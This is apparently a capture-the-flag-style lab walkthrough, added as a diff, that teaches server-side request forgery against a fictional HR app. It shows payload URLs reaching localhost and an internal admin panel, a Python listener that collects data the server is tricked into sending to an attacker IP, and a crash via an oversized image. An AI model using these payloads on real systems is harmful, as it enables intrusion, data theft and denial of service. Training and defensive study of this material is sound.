@@ -1,0 +1,124 @@
+Basic SSRF is a web attack technique where an attacker tricks a server into making requests on their behalf, often targeting internal systems or third-party services. By exploiting vulnerabilities in input validation, the attacker can gain unauthorised access to sensitive information or control over remote resources, posing a significant security risk to the targeted application and its underlying infrastructure.
+
+A basic SSRF can be employed against a local or an internal server.
+
+Scenario - I: SSRF Against a Local Server
+In this attack, the attacker makes an unauthorised request to the server hosting the web application. The attacker typically supplies a loopback IP address or localhost to receive the response. The vulnerability arises due to how the application handles input from the query parameter or API calls. 
+
+http://hrms.thm/?url=localhost/copyright
+However, due to insufficient validation of the input URL, an attacker can manipulate this functionality for SSRF attacks. By changing the URL parameter to point to other pages/services, the attacker can force the HRMS server to make requests to other pages. For instance, if the attacker uses a URL like http://hrms.thm/?url=localhost/config, and config is a valid page, the HRMS server will attempt to fetch content from this page and display the result. 
+
+We will notice that once we visit the page http://hrms.thm(opens in new tab), it automatically redirects to http://hrms.thm/?url=localhost/copyright. The webpage shows the copyright status of the website.
+This means the developer has probably made some mistakes while handling a file showing the copyright status.
+Let's try to change the URL from http://hrms.thm/?url=localhost/copyright to http://hrms.thm/?url=localhost/hello; it displays an error that hello.php is not found.
+
+
+
+Scenario - II: Accessing an Internal Server
+In complex web applications, it is common for front-end web applications to interact with back-end internal servers. These servers are generally hosted on non-routable IP addresses, so an internet user cannot access them. In this scenario, an attacker exploits a vulnerable web application's input validation to trick the server into requesting internal resources on the same network. They could provide a malicious URL as input, making the server interact with the internal server on their behalf.
+For instance, if an internal server provides database management or administrative controls, the attacker could craft a URL that initiates an unintended action on these internal systems when processed by the vulnerable web application. Technically, this is achieved through manipulated input, such as special IP addresses (like 192.168.x.x or 10.x.x.x for IPv4) or domain names (e.g., internal-database.hrms.thm). When not properly sanitised, these inputs can be used in functions like HTTP requests or file inclusions within the web application. The server, interpreting these requests as legitimate, then inadvertently performs actions or retrieves data from other internal services.
+
+From the config file, we can see that the admin panel is hosted at http://192.168.2.10/admin.php. If we try to log in to the admin panel, it is not accessible directly. Let's try to access it; it will show an error.
+We have no route to that IP as it's a private network IP and can only be accessed by a machine within the same network.
+If we check the source of the HTML, it shows that the dropdown takes the URL from an internal system and renders the data. The details of all employees are being rendered from http://192.168.2.10/employees.php.
+That's great, so the dropdown is accessing an internal system; what if we try to change the request such that instead of loading the employee page, we forge the request and send http://192.168.2.10/admin.php as a parameter to the server?
+Let's do that. Use the Inspect Element option and change the drop down value of salary from http://192.168.2.10/salary.php to http://192.168.2.10/admin.php
+
+
+Blind SSRF With Out-Of-Band 
+Out-of-band SSRF is a technique where the attacker leverages a separate, out-of-band communication channel instead of directly receiving responses from the target server to receive information or control the exploited server. This approach is practical when the server's responses are not directly accessible to the attacker.
+For instance, the attacker might manipulate the vulnerable server to make a DNS request to a domain he owns or to initiate a connection to an external server with specific data. This external interaction provides the attacker with evidence that the SSRF vulnerability exists and potentially allows him to gather additional information, such as internal IP addresses or the internal network's structure.
+ 
+ Once again, log in to the dashboard and click on the Profile tab in the navigation bar. We will see that it redirects to http://hrms.thm/profile.php?url=localhost/getInfo.php, which displays a message that data is being sent.
+ analysis of the page shows that it is reading url parameters, and without performing any validation, it sends the information to the server mentioned in the url parameter. 
+Here, an attacker can redirect the request to their server, thus getting additional information for exploitation or data pilferage. 
+On your AttackBox, create a new file called server.py and add the following code to it:
+           from http.server import SimpleHTTPRequestHandler, HTTPServer
+from urllib.parse import unquote
+class CustomRequestHandler(SimpleHTTPRequestHandler):
+
+    def end_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        super().end_headers()
+
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Hello, GET request!')
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+
+        self.send_response(200)
+        self.end_headers()
+
+        # Log the POST data to data.html
+        with open('data.html', 'a') as file:
+            file.write(post_data + '\n')
+        response = f'THM, POST request! Received data: {post_data}'
+        self.wfile.write(response.encode('utf-8'))
+
+if __name__ == '__main__':
+    server_address = ('', 8080)
+    httpd = HTTPServer(server_address, CustomRequestHandler)
+    print('Server running on http://localhost:8080/')
+    httpd.serve_forever()
+
+
+
+root@machine$ sudo chmod +x server.py && sudo python3 server.py
+
+http://hrms.thm/profile.php?url=http://192.168.139.153:8080
+
+
+Semi-Blind SSRF (Time-based)
+Time-based SSRF is a variation of SSRF where the attacker leverages timing-related clues or delays to infer the success or failure of their malicious requests. By observing how long it takes for the application to respond, the attacker can make educated guesses about whether their SSRF attack was successful. 
+
+The attacker sends a series of requests, each targeting a different resource or URL. The attacker measures the response times for each request. If a response takes significantly longer, it may indicate that the server successfully accessed the targeted resource, implying a successful SSRF attack.
+
+
+
+
+
+
+
+
+
+Crashing the Server
+
+In this SSRF demonstration, we will illustrate how an attacker can exploit a web application to cause a denial of service on the server. In our scenario, the vulnerability is exploited by supplying a malicious URL that points to a resource which, when accessed by the server, leads to excessive resource consumption or triggers a crash.
+
+For example, the attacker might input a URL pointing to a large file on a slow server or a service that responds with an overwhelming amount of data. When the vulnerable application naively accesses this URL, it engages in an action that exhausts its own system resources, leading to a slowdown or complete crash.
+
+How it works
+
+Once we log in to the dashboard, we will see a tab called Training in the navigation bar, which is used to load the training content for the employees.
+Once we click on that tab, we will see that it redirects to the URL http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg(opens in new tab), which shows training content.
+Once we access the URL http://hrms.thm/?url=localhost/url, we will see the following code at the footer (only works if the user is not logged in).
+
+url.php
+<?php
+....
+....
+    if ($imageSize < 100) {
+		  // Output the image if it's within the size limit
+    
+		$base64Image = downloadAndEncodeImage($imageUrl);
+        echo '<img src="' . htmlspecialchars($base64Image) . '" alt="Image" style="width: 100%; height: 100%; object-fit: cover;">';
+
+    } else {
+	 	// Memory Outage - server will crash
+    
+....
+...
+The above code shows that the url.php loads an image; if the image size exceeds 100KB, it shows a memory outage message and throws an error.
+Let's try to crash the server by loading an image greater than 100 KB. For your convenience, we already have such an image available, which you can forge via http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg.
+
+
+
+
+
+        
